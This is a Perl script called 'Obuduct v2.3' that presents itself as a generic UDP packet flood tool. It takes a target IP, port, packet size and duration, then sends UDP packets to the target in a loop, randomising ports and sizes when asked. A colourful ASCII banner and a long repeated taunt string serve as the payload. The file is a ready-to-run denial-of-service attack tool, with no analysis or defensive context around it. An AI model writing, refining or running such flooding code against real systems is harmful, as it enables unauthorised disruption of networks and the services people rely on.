#!/usr/bin/perl
# succ 
# Obuduct v2.3
 
use Socket;
use strict;
use Term::ANSIColor; 

if ($#ARGV != 3) {
  print color "green";
  print colored ['cyan'], "Obuduct v2.3";print colored ['magenta'], " Generic UDP Packet Flood\n";
  print colored ['yellow'], " Transmissional."; print colored ['blue']," Capabilities Exceed.\n";
  print colored ['red'], "               ---\n";
  print colored ['green'],"obuduct.pl"; print colored ['red']," <ip> <port> <size> <time>\n\n";
  print colored ['magenta']," port=0:"; print colored ['green']," use random ports\n";
  print colored ['magenta']," size=65500:";print colored ['green']," use random size between 64 and 65500\n";
  print colored ['magenta']," time=0:"; print colored ['green'],"continuous flood\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
  
 
    print colored(['red']," 
                               
                                                     L)+OO#)HOHIOI O
                                                   ):##+;+:++,H+,+);L=
                                                 ;;)L+L+);),;;LHHOO,)ii+iH;
                                                ,=LOO;+=;;;:+=:,))::;=,;=L
                                              ;,OiO)I),H;L#)));#;:=H=+L+:
                                             :L#,:=+;II=Ii),:H,H,),I,O+)
                                             O+=,#,)OOOO,,L+)I)=I;,#I,O
                                             H,):,)OO,),);,,H;O=,=I:++
                                           ,:,O))O,,::,L:H+LO,H:,I)H
                                           iiOIH=OO,O,)OL+H):+),::
                                           :;II)IH))IO;)++;+O+)+):
          I                               ,i+==: ) IO,,;)))I,):L;:
  HO  OO  I                              )+   =    ))II)L:,:,I=I;H
 )# ;)=  ))        +                                ,O::=iO,)O+O;H:
iLIOOH  +O         )I                                IH:II;)+I;I+=,
,)#L,IH ;H#i       )II                              =)+,+)+)I+)I=O+)
++)#,O)iLLOOO)#+++HOH;                              ))H=+O;OH#+HH)O=I
  ,))H#OHOOI))I)OH):                                LL#O);O)#;I;+=HOO;i;
    ,))HIOI);;)OO)                                )):+;))Li#)#I#)L#O##HO)i
       i:HOII+===                      ) :I : +II)IO)IHH+,:OOO+;:OHO#O#Ii=
          =OO)I#;                    )))=I,O+HOO),:);O):);)))H;OIIO###Hi
           ))HL)H                  ))#)=IOO,=+OO,;L;:O)=;)OH))#i)IHO##O);
           i;:HI#)                ::OHO)O,OO,H)OOO;+;i);OLIIOL)LHH##OOL:
          =;O#)O)O,              +H=;+)LI;O+OH;;i+OHIO,#LOOO###++O#H )+:
           ;==):)=iH         );)i)H:),I)O:O;)OOO##OOO;:)+i#)O:#=;##LiI,
           )H##HOi=OO     I:I:))H,)+H))I)+)HOO)=),+):O)=),,OO,+IIOH=L
            iLO;:H):#HO ;)=#;O+I+,OIiH)I)+=#H)H#OOOH)+,##L)=:HIiO#L +
           ;IOH));#=IO,,+I=I=,IH==IH)OO#LH+:O)IIO)O)iL):#i#;H=II#I#)+
            =;),=):H+H))H=)IL+O+I)+HIH,H;   =,OI)+;;+OO,=###### ;,
            )=O;I,)O;OOIO),HOL;LL)OO)+      )##LOHOIL)#+HOO##O#
             ):II:,LI)HO#=#OO#:I)i,          =OOI:O+OO##i###OI=
             : iLi)I+iH;I+H +                 LH=)):)O#OOO OI+
                 +;i))+,                       ##O;+;,:;,)IL=i
                   +=,                         )L)HI:LOO)OI i,
                                               I#O#L:iIO))i;;
                                                IIOI+O)OL, ,
                                                 +i+OO#O#O         
\n"); 

			 print colored ['bold cyan'], "\t\tTransmissional.\n"; print colored ['bold magenta'], "\t\t\tCapabilities Exceed.\n";	



print colored ['bold green'], "Obuduct"; print colored ['bold magenta'], " 2.3";print colored ['bold green']," Flooding"; print colored ['bold red'], " $ip"; print " On Port" . ($port ? $port : "random") . print colored ['bold green'], " With " .
print colored ['bold red'], ($size ? " $size-Byte" : "random size") . " Packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Break With Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, 
pack("a$psize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afayouwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?youwantsucc?"), 
0, pack_sockaddr_in($pport, $iaddr));}
